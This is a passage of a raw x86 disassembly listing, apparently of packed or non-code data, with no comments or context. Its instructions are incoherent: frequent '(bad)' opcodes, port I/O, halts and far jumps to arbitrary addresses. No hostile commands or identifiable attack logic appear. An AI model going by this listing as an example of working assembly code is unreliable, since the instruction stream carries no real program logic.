  421d9f:	sub    bh,BYTE PTR [esi-0x20]
  421da2:	jg     0x421e0b
  421da4:	xchg   esi,eax
  421da5:	push   cs
  421da6:	jnp    0x421d69
  421da8:	aad    0xe8
  421daa:	xor    bh,bl
  421dac:	push   ecx
  421dad:	pop    ss
  421dae:	fimul  DWORD PTR ds:0x516f6f9c
  421db4:	dec    DWORD PTR [ecx+0x4f126cd4]
  421dba:	mov    ch,0x7d
  421dbc:	pop    esp
  421dbd:	popa   
  421dbe:	fisttp WORD PTR [esp+edx*4-0x741e4c5d]
  421dc5:	push   ss
  421dc6:	dec    edi
  421dc7:	sbb    DWORD PTR [ecx-0x1c],0xd
  421dcb:	dec    ecx
  421dcc:	push   ds
  421dcd:	cmc    
  421dce:	ror    BYTE PTR [esi],0xa8
  421dd1:	fcom   st(2)
  421dd3:	stc    
  421dd4:	add    ebp,DWORD PTR [ebx+0x5451d514]
  421dda:	call   0x35e03c4e
  421ddf:	mov    dh,0xa9
  421de1:	mov    dl,0xc5
  421de3:	ins    DWORD PTR es:[edi],dx
  421de4:	fisttp QWORD PTR [edx]
  421de6:	cmc    
  421de7:	ret    
  421de8:	xor    eax,0x5b8db850
  421ded:	ss leave 
  421def:	push   0x3
  421df1:	add    eax,0xfa76e7e7
  421df6:	div    DWORD PTR [edx+0x72]
  421df9:	mov    bh,0x3
  421dfb:	fmul   QWORD PTR [eax]
  421dfd:	jae    0x421d7f
  421dff:	dec    edi
  421e00:	cmp    cl,bh
  421e02:	das    
  421e03:	(bad)
  421e07:	jmp    0xf5a6:0x5678a5e3
  421e0e:	or     eax,0x7aa673c0
  421e13:	jecxz  0x421dab
  421e15:	mov    ah,al
  421e17:	repz fbld TBYTE PTR [esi-0x6]
  421e1b:	add    eax,0x26a7217e
  421e20:	or     DWORD PTR [eax],ecx
  421e22:	mov    esp,DWORD PTR [ebp+0x44]
  421e25:	sub    DWORD PTR [eax+eax*1+0x68],esp
  421e29:	jae    0x421e6d
  421e2b:	cwde   
  421e2c:	pushf  
  421e2d:	(bad)  
  421e2e:	push   eax
  421e2f:	pop    esi
  421e30:	outs   dx,DWORD PTR ds:[esi]
  421e31:	jae    0x421df0
  421e33:	xlat   BYTE PTR ds:[ebx]
  421e34:	jge    0x421e12
  421e36:	jge    0x421eb4
  421e38:	xchg   eax,ebp
  421e3a:	mov    edx,0xa65e2270
  421e3f:	out    dx,eax
  421e40:	xor    cl,dl
  421e42:	std    
  421e43:	pop    edx
  421e44:	sub    BYTE PTR [edx+0x753f78d7],bl
  421e4a:	add    ecx,eax
  421e4c:	ror    DWORD PTR [ecx+0xf],0xc5
  421e50:	icebp  
  421e51:	fst    DWORD PTR ds:0xc819d5b
  421e57:	mov    DWORD PTR [ecx+0x57],esi
  421e5a:	cmp    BYTE PTR [edx],bh
  421e5c:	scas   al,BYTE PTR es:[edi]
  421e5d:	retf   
  421e5e:	jecxz  0x421e3c
  421e60:	mov    ds:0x635709e7,eax
  421e65:	hlt    
  421e66:	lock xchg BYTE PTR [edi],bl
  421e69:	or     eax,0xca2f4379
  421e6e:	pop    ebx
  421e6f:	out    dx,eax
  421e70:	enter  0x4319,0x5a
  421e74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e75:	stos   DWORD PTR es:[edi],eax
  421e76:	repnz xor al,0x17
  421e79:	test   BYTE PTR [edx+eiz*4-0x4a9879d8],bl
  421e80:	rcr    bl,cl
  421e82:	xchg   esi,eax
  421e83:	fstp   DWORD PTR [ecx-0x6e]
  421e86:	ss push ebx
  421e88:	je     0x421e55
  421e8a:	fild   DWORD PTR [eax]
  421e8c:	mov    ecx,0x92ca3aa4
  421e91:	fidivr DWORD PTR [edx+0x27e92375]
  421e97:	pop    eax
  421e98:	sahf   
  421e99:	out    dx,al
  421e9a:	clc    
  421e9b:	push   ss
  421e9c:	and    edi,ebx
  421e9e:	in     al,0x2e
  421ea0:	mov    dl,0x41
  421ea2:	pop    ds
  421ea3:	rcr    BYTE PTR [ebp+0x248d0c21],cl
  421ea9:	nop
  421eaa:	pop    edx
  421eab:	or     cl,ah
  421ead:	out    0x30,al
  421eaf:	lods   al,BYTE PTR ds:[esi]
  421eb0:	dec    ebp
  421eb1:	ins    BYTE PTR es:[edi],dx
  421eb2:	jmp    0x421e66
  421eb4:	pop    edi
  421eb5:	enter  0x571f,0xde
  421eb9:	ja     0x421ee4
  421ebb:	push   edx
  421ebc:	outs   dx,DWORD PTR ds:[esi]
  421ebd:	fsub   st,st(4)
  421ebf:	mov    bh,0xa9
  421ec1:	mov    ebx,DWORD PTR [ecx]
  421ec3:	outs   dx,BYTE PTR ds:[esi]
  421ec4:	stos   BYTE PTR es:[edi],al
  421ec5:	inc    ebp
  421ec6:	add    esi,edi
  421ec8:	les    esp,FWORD PTR [ebx]
  421eca:	cli    
  421ecb:	test   al,0xe7
  421ecd:	add    BYTE PTR [esi+0x20],cl
  421ed0:	nop
  421ed1:	iret   
  421ed2:	or     dh,BYTE PTR [ecx+0x34]
  421ed5:	(bad)  
  421ed6:	or     ebp,DWORD PTR [eax-0x3ebca046]
  421edc:	xchg   ebp,eax
  421edd:	fidiv  WORD PTR [edx+0x42]
  421ee0:	and    eax,0x703e86a6
  421ee5:	(bad)  
  421ee6:	jecxz  0x421f0a
  421ee8:	loopne 0x421ed2
  421eea:	or     BYTE PTR [edi+0x28],ah
  421eed:	jmp    0x4b2c:0x93653da0
  421ef4:	jle    0x421ee0
  421ef6:	jne    0x421f67
  421ef8:	push   ebp
  421ef9:	cdq    
  421efa:	inc    esp
  421efb:	out    0x82,eax
  421efd:	and    BYTE PTR [edi+0x72],ah
  421f00:	adc    eax,0x1b6816de
  421f05:	sub    eax,0xca08baaa
  421f0a:	cmp    ebx,eax
  421f0c:	rcr    BYTE PTR [esi+0x2e781243],cl
  421f12:	scas   eax,DWORD PTR es:[edi]
  421f13:	shl    al,cl
  421f15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f16:	sub    edi,0xb3f0c9f3
  421f1c:	ficomp DWORD PTR [esi-0x2cdcbc29]
  421f22:	or     al,0x78
  421f24:	push   edi
  421f25:	(bad)  
  421f26:	inc    esp
  421f27:	pop    eax
  421f28:	xchg   esp,eax
  421f29:	(bad)  
  421f2a:	xchg   edx,eax
  421f2b:	add    esi,DWORD PTR [edx-0x72]
  421f2e:	push   ecx
  421f2f:	lock xchg ebp,eax
  421f31:	scas   eax,DWORD PTR es:[edi]
  421f32:	(bad)  [ecx+0x6b33cf7]
  421f38:	dec    edx
  421f39:	scas   eax,DWORD PTR es:[edi]
  421f3a:	add    al,0xcf
  421f3c:	mov    ds:0x3599e533,al
  421f41:	ror    DWORD PTR [esi],1
  421f43:	nop
  421f44:	mov    ah,dh
  421f46:	fdivr  QWORD PTR [ecx]
  421f48:	xchg   edi,eax
  421f49:	pop    ds
  421f4a:	xchg   BYTE PTR [ecx+edx*1],al
  421f4d:	(bad)  
  421f4e:	icebp  
  421f4f:	cmp    cl,BYTE PTR [edx+0x3c]
  421f52:	popf   
  421f53:	and    BYTE PTR [esi+0x1691107a],ah
  421f59:	inc    ebp
  421f5a:	push   esi
  421f5b:	mov    eax,0x1ee8f330
  421f60:	or     BYTE PTR [ebx-0x75],0x4f
  421f64:	outs   dx,DWORD PTR ds:[esi]
  421f65:	rol    BYTE PTR [esi-0x3191528e],cl
  421f6b:	repnz fadd QWORD PTR ds:[ebx-0xa7f3c52]
  421f73:	add    ah,BYTE PTR ds:0xff3675c2
  421f79:	ficomp WORD PTR [ebx+edi*1-0x57]
  421f7d:	xor    DWORD PTR [ebx+0x56ba7de7],edx
  421f83:	lods   al,BYTE PTR ds:[esi]
  421f84:	test   BYTE PTR [ebx-0x23],ch
  421f87:	pop    ebp
  421f88:	dec    esi
  421f89:	cli    
  421f8a:	mov    DWORD PTR [esi-0x60],eax
  421f8d:	inc    ebx
  421f8e:	sub    al,0x4d
  421f90:	or     eax,0xe2058a60
  421f95:	bound  esp,QWORD PTR [ebx-0x47d2db8b]
  421f9b:	iret   
  421f9c:	xor    BYTE PTR [esi+0x57c49ff5],dl
  421fa2:	(bad)  
  421fa3:	jb     0x421fb8
  421fa5:	dec    esi
  421fa6:	retf   
  421fa7:	pop    es
  421fa8:	cs mov cl,0xcc
  421fab:	ror    dl,1
  421fad:	test   DWORD PTR [eax-0x77dbb923],edi
  421fb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fb4:	retf   0xc1a8
  421fb7:	sub    al,0xde
  421fb9:	jp     0x421fce
  421fbb:	mov    ch,BYTE PTR [edi]
  421fbd:	fmulp  st(0),st
  421fbf:	mov    ah,0x43
  421fc1:	loopne 0x421fc5
  421fc3:	ja     0x421f6e
  421fc5:	jmp    0xf439:0x19bd1f0c
  421fcc:	or     BYTE PTR [ebp-0xa],bh
  421fcf:	iret   
  421fd0:	das    
  421fd1:	scas   al,BYTE PTR es:[edi]
  421fd2:	cli    
  421fd3:	outs   dx,BYTE PTR ds:[esi]
  421fd4:	mov    bh,0xb6
  421fd6:	lea    esi,[ebx-0x58abee9e]
  421fdc:	in     eax,0x9d
  421fde:	jnp    0x421f74
  421fe0:	sbb    al,0xaa
  421fe2:	pop    ebp
  421fe3:	fs jle 0x42205e
  421fe6:	jmp    0x3e87:0xd244e249
  421fed:	jge    0x421fba
  421fef:	call   0x3d2e00fa
  421ff4:	aam    0xf3
  421ff6:	sub    eax,0x730cbb68
  421ffb:	pop    ebx
  421ffc:	mov    dh,0x8a
  421ffe:	(bad)  
  421fff:	int3   
  422000:	mov    bh,0x5a
  422002:	jmp    0x421fe6
  422004:	sub    dl,BYTE PTR [edi+0xb0e57c6]
  42200a:	iret   
  42200b:	pop    esi
  42200c:	xchg   esp,eax
  42200d:	mov    dl,0x4f
  42200f:	(bad)  
  422011:	in     eax,0x16
  422013:	aas    
  422014:	lea    edx,ds:0x174813eb
  42201a:	shl    DWORD PTR [esp+ebp*4-0x22],cl
  42201e:	shr    DWORD PTR [ebx+0x6d],0x91
  422022:	sbb    BYTE PTR [esi+0x44a70598],ah
  422028:	jo     0x421fb8
  42202a:	mov    esp,0xc17c4ac7
  42202f:	xor    ecx,DWORD PTR [ebp-0x5f]
  422032:	cmp    BYTE PTR [ebx+0x62],cl
  422035:	push   ss
  422036:	xor    eax,0xdb257a60
  42203b:	out    dx,al
  42203c:	sub    dh,bl
  42203e:	or     BYTE PTR [esi],cl
  422040:	je     0x422090
  422042:	and    BYTE PTR [ebx],ch
  422044:	ins    BYTE PTR es:[edi],dx
  422045:	mul    ebx
  422047:	sub    eax,0xf23a0942
  42204c:	icebp  
  42204d:	sbb    eax,0x48d31b6
  422052:	push   esp
  422053:	fnstsw WORD PTR [ebx+0x285a1766]
  422059:	(bad)  
  42205a:	repz fadd DWORD PTR [ebp-0x2c]
  42205e:	test   DWORD PTR [ebx+edi*4],0x76d9862
  422065:	add    esi,DWORD PTR [edx]
  422067:	inc    DWORD PTR [ebx-0x4faff767]
  42206d:	and    ecx,DWORD PTR [esi]
  42206f:	adc    WORD PTR [edi-0x33],bx
  422073:	scas   eax,DWORD PTR es:[edi]
  422074:	xchg   esi,eax
  422075:	sti    
  422076:	ret    
  422077:	rcl    BYTE PTR [eax],0xf8
  42207a:	fbstp  TBYTE PTR [ebx+0x3b8985de]
  422080:	push   edx
  422081:	mov    eax,ds:0xa48d1d66
  422086:	je     0x4220b1
  422088:	sub    DWORD PTR [edx+0x531e1ec6],eax
  42208e:	dec    esp
  42208f:	popf   
  422090:	(bad)  
  422091:	test   BYTE PTR [ebp+edi*8-0x37],0xc4
  422096:	jmp    0xc12bda96
  42209b:	adc    BYTE PTR [esi-0x7b],0x61
  42209f:	jmp    0x3a75:0x421c33a7
  4220a6:	push   0x5
  4220a8:	jns    0x422070
  4220aa:	jmp    0x422042
  4220ac:	hlt    
  4220ad:	mov    dl,0x89
  4220af:	jmp    0x71e5:0x9b8e6438
  4220b6:	xchg   edx,eax
  4220b7:	out    0x9b,eax
  4220b9:	ins    DWORD PTR es:[edi],dx
  4220ba:	push   edi
  4220bb:	cmp    eax,0x571b2d42
  4220c0:	mov    ss,WORD PTR [edx-0x4d]
  4220c3:	repz add BYTE PTR [ebx],dh
  4220c6:	jno    0x4220ad
  4220c8:	fsubr  DWORD PTR [esi]
  4220ca:	popa   
  4220cb:	test   al,0xf7
  4220cd:	mov    BYTE PTR [ebp+0x60],dl
  4220d0:	popf   
  4220d1:	cdq    
  4220d2:	das    
  4220d3:	and    eax,0x19a2b488
  4220d8:	xchg   DWORD PTR [esi+0x1506988a],ebx
  4220de:	mov    ecx,0x702f047b
  4220e3:	out    dx,eax
  4220e4:	ss push ss
  4220e6:	mov    DWORD PTR [eax+0x5e],0xdd027dc0
  4220ed:	or     esp,DWORD PTR [edx+eax*1-0x52]
  4220f1:	jmp    0xa588176a
  4220f6:	ficom  WORD PTR [esp+eax*4+0x5b]
  4220fa:	cmp    DWORD PTR [edx-0x25fc057a],ebx
  422100:	or     DWORD PTR [ecx+0x44c273e1],ecx
  422106:	jge    0x422137
  422108:	sbb    dl,BYTE PTR [ecx+0x598078c4]
  42210e:	ret    0x40eb
  422111:	ins    DWORD PTR es:[edi],dx
  422112:	and    DWORD PTR [eax+0x32],edi
  422115:	sub    BYTE PTR [ecx],0x8a
  422118:	(bad)  
  422119:	jmp    0x4220ea
  42211b:	jbe    0x4220ac
  42211d:	jno    0x422146
  42211f:	pop    ss
  422120:	and    eax,0x1ac9f5f2
  422125:	inc    eax
  422126:	pushf  
  422127:	push   ds
  422128:	dec    esi
  422129:	pop    esp
  42212a:	shr    BYTE PTR [ebp-0x26],0x82
  42212e:	call   0x3ebb8214
  422133:	scas   eax,DWORD PTR es:[edi]
  422134:	(bad)  [eax-0x3cb0c6ae]
  42213a:	stc    
  42213b:	jno    0x422148
  42213d:	ffree  st(7)
  42213f:	or     al,0x30
  422141:	xchg   esp,eax
  422142:	(bad)  
  422143:	or     edi,eax
  422145:	fisub  DWORD PTR [edx]
  422147:	popf   
  422148:	es mov ch,0x35
  42214b:	jb     0x42214e
  42214d:	lods   eax,DWORD PTR ds:[esi]
  42214e:	loope  0x422154
  422150:	clc    
  422151:	jl     0x42212e
  422153:	pop    esp
  422154:	and    BYTE PTR [ecx],bh
  422156:	xlat   BYTE PTR gs:[ebx]
  422158:	jle    0x4220f5
  42215a:	sub    BYTE PTR [ecx],dl
  42215c:	fwait
  42215d:	ins    BYTE PTR es:[edi],dx
  42215e:	outs   dx,BYTE PTR ds:[esi]
  42215f:	mov    ebx,0x9c156f6f
  422164:	test   ebx,esi
  422166:	push   edi
  422167:	in     eax,dx
  422168:	ror    edx,cl
  42216a:	shl    BYTE PTR [edi+0x1b],cl
  42216d:	jg     0x42219c
  42216f:	pop    ebp
  422170:	bound  ecx,QWORD PTR [eax+esi*1+0x3c]
  422174:	mov    ebx,0xc1c50c2f
  422179:	push   edx
  42217a:	out    dx,eax
  42217b:	mov    esp,0xf71f9b96
  422180:	xchg   ebp,eax
  422181:	out    dx,al
  422182:	popf   
  422183:	out    dx,al
  422184:	scas   eax,DWORD PTR es:[edi]
  422185:	gs sub al,0xda
  422188:	aad    0x6f
  42218a:	jno    0x422147
  42218c:	out    dx,al
  42218d:	mov    esi,0xb09dddf0
  422192:	lods   al,BYTE PTR ds:[esi]
  422193:	test   BYTE PTR [edx],0xd0
  422196:	ret    0xb7b2
  422199:	adc    edx,eax
  42219b:	(bad)  
  42219d:	xor    al,0x4c
  42219f:	inc    ebp
  4221a0:	je     0x422155
  4221a2:	mov    dl,0xa6
  4221a4:	xor    ecx,DWORD PTR [ebp-0x5a]
  4221a7:	shl    DWORD PTR [ecx+0x19e1b9cc],cl
  4221ad:	mov    dh,0xe8
  4221af:	repz push esp
  4221b1:	jle    0x42219b
  4221b3:	xchg   DWORD PTR [ebp-0x72],ebp
  4221b6:	pop    esp
  4221b7:	mov    ds:0xce141e2a,eax
  4221bc:	je     0x4221bd
  4221be:	jo     0x422226
  4221c0:	fs pop ss
  4221c2:	outs   dx,BYTE PTR ds:[esi]
  4221c3:	mov    ebp,0x6f462810
  4221c8:	icebp  
  4221c9:	(bad)  
  4221ca:	mov    esp,DWORD PTR [ebp+0x752042b0]
  4221d0:	inc    eax
  4221d1:	loop   0x4221b3
  4221d3:	(bad)  [ebx+0x62]
  4221d6:	cmp    al,0xe5
  4221d8:	pop    eax
  4221d9:	pop    ebp
  4221da:	repz not DWORD PTR [edi+esi*2+0x13]
  4221df:	adc    al,0xbf
  4221e1:	ja     0x422203
  4221e3:	jae    0x42225d
  4221e5:	xor    esi,esi
  4221e7:	(bad)  
  4221e8:	lds    ecx,FWORD PTR [ecx]
  4221ea:	adc    DWORD PTR [eax],esp
  4221ec:	dec    ebx
  4221ed:	push   edx
  4221ee:	and    ecx,DWORD PTR [ebp-0x34cc060c]
  4221f4:	aaa    
  4221f5:	dec    edi
  4221f6:	add    al,0xc0
  4221f8:	adc    DWORD PTR [ebp-0x386a3b7b],esp
  4221fe:	pop    ds
  4221ff:	cmp    al,0x3e
  422201:	lods   al,BYTE PTR ds:[esi]
  422202:	cli    
  422203:	iret   
  422204:	mov    dl,0x84
  422206:	icebp  
  422207:	sbb    eax,0x5ffd50d5
  42220c:	mov    DWORD PTR [edi+0x5b],eax
  42220f:	sbb    dl,cl
  422211:	sbb    edi,esp
  422213:	jmp    DWORD PTR [ebp-0x2b35577d]
  422219:	add    al,cl
  42221b:	adc    eax,0x9c7fdfb1
  422220:	shr    BYTE PTR [edx],0x7e
  422223:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422224:	push   ebx
  422225:	ins    DWORD PTR es:[edi],dx
  422226:	xor    eax,0xd4407ab9
  42222b:	(bad)  
  42222c:	dec    edi
  42222d:	aas    
  42222e:	push   0x28b5fd6a
  422233:	idiv   DWORD PTR [edi+0x5dd8718c]
  422239:	sub    ebp,edx
  42223b:	mov    ch,0x8e
  42223d:	shr    dh,1
  42223f:	push   edi
  422240:	jno    0x4222ba
  422242:	sub    bl,BYTE PTR [edi*1+0x4cb9e60d]
  422249:	xchg   esp,eax
  42224a:	adc    al,0x32
  42224c:	xchg   BYTE PTR [esi],cl
  42224e:	xor    al,0xf
  422250:	cld    
  422251:	(bad)  
  422252:	mov    ebp,0xf74c82cb
  422257:	xor    eax,0xe7dd6f12
  42225c:	inc    ebx
  42225d:	pop    ebx
  42225e:	and    BYTE PTR [ecx+esi*2-0x2113a7df],dh
  422265:	popf   
  422266:	xor    edi,DWORD PTR [ecx+0x50]
  422269:	neg    DWORD PTR [ebx+0x6e]
  42226c:	cmp    al,0x5f
  42226e:	into   
  42226f:	adc    ebp,0xb02f6788
  422275:	xchg   BYTE PTR [eax-0x3e264e01],bl
  42227b:	scas   al,BYTE PTR es:[edi]
  42227c:	loopne 0x4222a7
  42227e:	outs   dx,DWORD PTR ds:[esi]
  42227f:	int3   
  422280:	sub    eax,0xb550e00d
  422285:	imul   esi,DWORD PTR [edi],0xffffffc1
  422288:	mov    al,0x8a
  42228a:	loopne 0x422247
  42228c:	sbb    DWORD PTR [esp+esi*1+0x58],edi
  422290:	mov    ds:0xe42a6844,al
  422295:	jb     0x422253
  422297:	leave  
  422298:	pop    edi
  422299:	cli    
  42229a:	jmp    0xe534:0x34f6db5a
  4222a1:	add    eax,0x0
  4222a6:	add    BYTE PTR [eax],al
  4222a8:	add    BYTE PTR [eax],al
  4222aa:	inc    edx
  4222ab:	inc    esp
  4222ac:	inc    ebx
  4222ad:	push   edi
  4222ae:	inc    edi
  4222af:	push   edi
  4222b0:	push   esi
  4222b1:	push   ebp
  4222b2:	outs   dx,DWORD PTR ds:[esi]
  4222b3:	pop    ebp
  4222b4:	mov    ds:0x77cb62dc,eax
  4222b9:	loope  0x42230b
  4222bb:	mov    cl,0x1
  4222bd:	add    BYTE PTR [eax-0x26fffffa],al
  4222c3:	fdivr  DWORD PTR [eax-0x56bca97f]
  4222c9:	fld    DWORD PTR [esi+0xcd5426]
  4222cf:	inc    ebx
  4222d0:	xchg   ebx,eax
  4222d1:	inc    ebp
  4222d2:	aad    0x22
  4222d4:	lahf   
  4222d5:	nop
  4222d6:	inc    ecx
  4222d7:	or     DWORD PTR [edi+0x66],0x2c0aea13
  4222de:	inc    ecx
  4222df:	and    al,0xdc
  4222e1:	les    edx,FWORD PTR [ecx+eax*8]
  4222e4:	xchg   ecx,eax
  4222e5:	sbb    bl,BYTE PTR [edx]
  4222e7:	pushf  
  4222e8:	iret   
  4222e9:	lock xchg ecx,eax
  4222eb:	mov    ds,WORD PTR [edi-0x5d96fa08]
  4222f1:	sub    al,0x2a
  4222f3:	out    dx,al
  4222f4:	add    eax,0x1b3e07ee
  4222f9:	mov    edx,0x85a2c48f
  4222fe:	jns    0x4222db
  422300:	and    BYTE PTR [ecx-0x5a43a194],ch
  422306:	scas   al,BYTE PTR es:[edi]
  422307:	inc    ebp
  422308:	imul   edx,DWORD PTR [edx-0x54],0x61
  42230c:	pop    ds
  42230d:	ins    DWORD PTR es:[edi],dx
  42230e:	pop    edi
  42230f:	or     BYTE PTR [esi-0x1a],bl
  422312:	mov    eax,ds:0xee3c692
  422317:	in     eax,dx
  422318:	sar    DWORD PTR [ebp+0x148e145a],0x21
  42231f:	pop    ds
  422320:	mov    al,0xa8
  422322:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422323:	sbb    bh,ch
  422325:	js     0x4222a7
  422327:	pop    ebx
  422328:	(bad)  
  422329:	js     0x422344
  42232b:	sahf   
  42232c:	jne    0x422383
  42232e:	xor    ebx,DWORD PTR [edi-0x16]
  422331:	in     eax,dx
  422332:	cmp    BYTE PTR [eax+0x4],dl
  422335:	xor    edi,eax
  422337:	adc    edx,DWORD PTR [eax+0x6b90aea6]
  42233d:	adc    edi,0x3a2317b
  422343:	lods   al,BYTE PTR ds:[esi]
  422344:	clc    
  422345:	sub    BYTE PTR [eax],0x3b
  422348:	call   0x5ce0:0x716deb74
  42234f:	push   ds
  422350:	mov    ecx,edi
  422352:	adc    ah,ch
  422354:	call   0xa0505091
  422359:	sub    ebx,DWORD PTR [ecx-0x5b]
  42235c:	and    DWORD PTR [ecx-0x65fa6e44],0x33
  422363:	pusha  
  422364:	sub    al,0xbb
  422366:	inc    ebx
  422367:	fdivr  DWORD PTR [edx+edi*2+0x416e65a2]
  42236e:	lea    esi,[eax]
  422370:	sub    al,0xec
  422372:	scas   eax,DWORD PTR es:[edi]
  422373:	jno    0x42232c
  422375:	dec    edx
  422376:	cmp    DWORD PTR [esi-0x19513b50],edi
  42237c:	push   ebp
  42237d:	push   0xeac3859c
  422382:	mov    ecx,0x56357de7
  422387:	add    eax,0xc8ba7745
  42238c:	je     0x422324
  42238e:	and    ebp,DWORD PTR gs:[bp+si]
  422392:	pop    ebp
  422393:	pop    ds
  422394:	mov    ds:0xaef9fa5f,al
  422399:	mov    edi,0x51f0397d
  42239e:	pushf  
  42239f:	lock sti 
  4223a1:	scas   eax,DWORD PTR es:[edi]
  4223a2:	fs adc al,0x1a
  4223a5:	out    dx,al
  4223a6:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4223a8:	sbb    al,0xe0
  4223aa:	(bad)  
  4223ab:	jp     0x422388
  4223ad:	mov    esi,ebp
  4223af:	xor    ebx,esi
  4223b1:	hlt    
  4223b2:	inc    esi
  4223b3:	jno    0x4223fe
  4223b5:	push   edi
  4223b6:	ret    
  4223b7:	std    
  4223b8:	icebp  
  4223b9:	addr16 or al,0x2
  4223bc:	enter  0xd6f6,0xdf
  4223c0:	xor    ah,ah
  4223c2:	push   eax
  4223c3:	push   0x2
  4223c5:	popf   
  4223c6:	jne    0x4223b2
  4223c8:	xor    al,bh
  4223ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223cb:	js     0x42241f
  4223cd:	sbb    al,0x6
  4223cf:	add    ebp,DWORD PTR [eax+edi*4]
  4223d2:	xlat   BYTE PTR ds:[ebx]
  4223d3:	jl     0x422408
  4223d5:	jmp    0x9764b350
  4223da:	add    BYTE PTR [edi],cl
  4223dc:	cdq    
  4223dd:	test   eax,0xe93cc441
  4223e2:	es gs mov ah,0x2a
  4223e6:	aaa    
  4223e7:	jmp    0x42244d
  4223e9:	es int3 
  4223eb:	call   0xc90a:0x454a42fc
  4223f2:	sti    
  4223f3:	hlt    
  4223f4:	call   0xb466:0x882eb3e6
  4223fb:	fnstsw ax
  4223fd:	add    bl,BYTE PTR [esi]
  4223ff:	rol    cl,1
  422401:	out    dx,al
  422402:	push   edi
  422403:	into   
  422404:	fdivr  QWORD PTR [eax]
  422406:	dec    ecx
  422407:	pop    edi
  422408:	imul   eax,DWORD PTR [ebp+0x9],0xfffffffd
  42240c:	mov    ecx,0xce69ceaa
  422411:	inc    edi
  422412:	sub    eax,0xb6caa0bf
  422417:	ins    BYTE PTR es:[edi],dx
  422418:	push   edx
  422419:	or     BYTE PTR [ebp+0x54],bl
  42241c:	jno    0x422421
  42241e:	jmp    FWORD PTR [edx+0x75]
  422421:	imul   DWORD PTR [ebx+0x37]
  422424:	ins    BYTE PTR es:[edi],dx
  422425:	ss addr16 stc 
  422428:	pop    esp
  422429:	loope  0x422438
  42242b:	adc    eax,0xb096602d
  422430:	nop
  422431:	and    eax,0x1291040
  422436:	nop
  422437:	or     esp,DWORD PTR [esi-0x7d7560e3]
  42243d:	sar    DWORD PTR [ecx+0x6dde460f],0x1b
  422444:	xor    DWORD PTR [ecx+0x3bf67039],esp
  42244a:	jmp    0xa27a:0x90600b14
  422451:	dec    eax
  422452:	jo     0x4223e2
  422454:	mov    WORD PTR [esi-0x44],gs
  422457:	cmp    DWORD PTR [edx-0x2f],0x6bad4a8f
  42245e:	push   esi
  42245f:	jp     0x422466
  422461:	add    bh,al
  422463:	jo     0x4223ff
  422465:	xchg   DWORD PTR [edi-0x48d469fd],edx
  42246b:	clc    
  42246c:	sub    DWORD PTR [ecx+0x68100667],esp
  422472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422473:	xor    DWORD PTR [eax],ebx
  422475:	sar    BYTE PTR [edi+0x32525235],1
  42247b:	sti    
  42247c:	sbb    eax,0x6bf38d45
  422481:	jmp    0xc357:0x1a8d9eb5
  422488:	in     al,0xf9
  42248a:	jmp    0x7796df21
  42248f:	std    
  422490:	or     bh,0x47
  422493:	sub    BYTE PTR [ecx+esi*2],al
  422496:	inc    esp
  422497:	icebp  
  422498:	add    DWORD PTR [edi-0x43],ecx
  42249b:	mov    ds:0x15709614,eax
  4224a0:	push   0x19
  4224a2:	loop   0x42242b
  4224a4:	retf   
  4224a5:	jne    0x422453
  4224a7:	mov    edi,cs
  4224a9:	repz pushf 
  4224ab:	imul   ebp,DWORD PTR [edi],0xffffff86
  4224ae:	inc    esp
  4224af:	lock out 0xfe,al
  4224b2:	add    ch,BYTE PTR [edx-0x6d]
  4224b5:	push   edx
  4224b6:	loope  0x4224c6
  4224b8:	push   esi
  4224b9:	or     eax,0xb84a462e
  4224be:	jge    0x422441
  4224c0:	mov    WORD PTR [ecx-0x94a12ea],ss
  4224c6:	jbe    0x4224e6
  4224c8:	lea    edx,[ebp+ebp*4+0x69]
  4224cc:	adc    ebx,DWORD PTR [ebx+0x63]
  4224cf:	les    edx,FWORD PTR [ebx]
  4224d1:	sub    eax,0x7022b59d
  4224d6:	jo     0x42251d
  4224d8:	push   eax
  4224d9:	inc    eax
  4224da:	cs push edi
  4224dc:	dec    ebx
  4224dd:	cwde   
  4224de:	xchg   ah,al
  4224e0:	(bad)  
  4224e2:	ror    bh,1
  4224e4:	sbb    DWORD PTR [ebp-0x48],ecx
  4224e7:	retf   
  4224e8:	lahf   
  4224e9:	mov    eax,0x32c9855f
  4224ee:	rcl    DWORD PTR gs:[esi+ebp*4],1
  4224f2:	push   ecx
  4224f3:	and    DWORD PTR [esi],esi
  4224f5:	out    0x38,al
  4224f7:	mov    ebx,0xc91b4e34
  4224fc:	into   
  4224fd:	dec    ebx
  4224fe:	scas   eax,DWORD PTR es:[edi]
  4224ff:	ins    DWORD PTR es:[edi],dx
  422500:	stos   DWORD PTR es:[edi],eax
  422501:	push   es
  422502:	imul   esi,esi,0xb14fab52
  422508:	jle    0x42251e
  42250a:	sub    ebx,DWORD PTR [ebx-0x398b3377]
  422510:	fcom   QWORD PTR [esi-0x220b22be]
  422516:	push   0xffffffe2
  422518:	xchg   esi,eax
  422519:	mov    al,ds:0xa5397170
  42251e:	or     cl,bh
  422520:	cld    
  422521:	in     eax,0x9b
  422523:	std    
  422524:	pop    ecx
  422525:	inc    esp
  422526:	pop    ecx
  422527:	pop    esp
  422528:	adc    edx,DWORD PTR [esp+ecx*4]
  42252b:	push   cs
  42252c:	scas   al,BYTE PTR es:[edi]
  42252d:	test   BYTE PTR [esi-0x31b9c6e0],cl
  422533:	or     eax,0x8671142e
  422538:	mov    dh,0x7c
  42253a:	in     eax,dx
  42253b:	(bad)  
  42253d:	test   BYTE PTR [esi],0x9f
  422540:	or     cl,BYTE PTR [edi-0x69]
  422543:	or     DWORD PTR [esi-0x6d534d3b],0x3b
  42254a:	inc    esi
  42254b:	adc    BYTE PTR [esi],cl
  42254d:	push   edi
  42254e:	rol    DWORD PTR [ebx*1+0x221a3efd],1
  422555:	push   ecx
  422556:	mov    bl,0xa7
  422558:	in     al,dx
  422559:	xchg   esp,eax
  42255a:	aad    0xd9
  42255c:	fistp  DWORD PTR [ebx+0x769cfa40]
  422562:	dec    edi
  422563:	sahf   
  422564:	pop    esi
  422565:	jecxz  0x4224e8
  422567:	add    eax,0xea92e658
  42256c:	rcl    DWORD PTR [ebx],0x33
  42256f:	mov    al,0x24
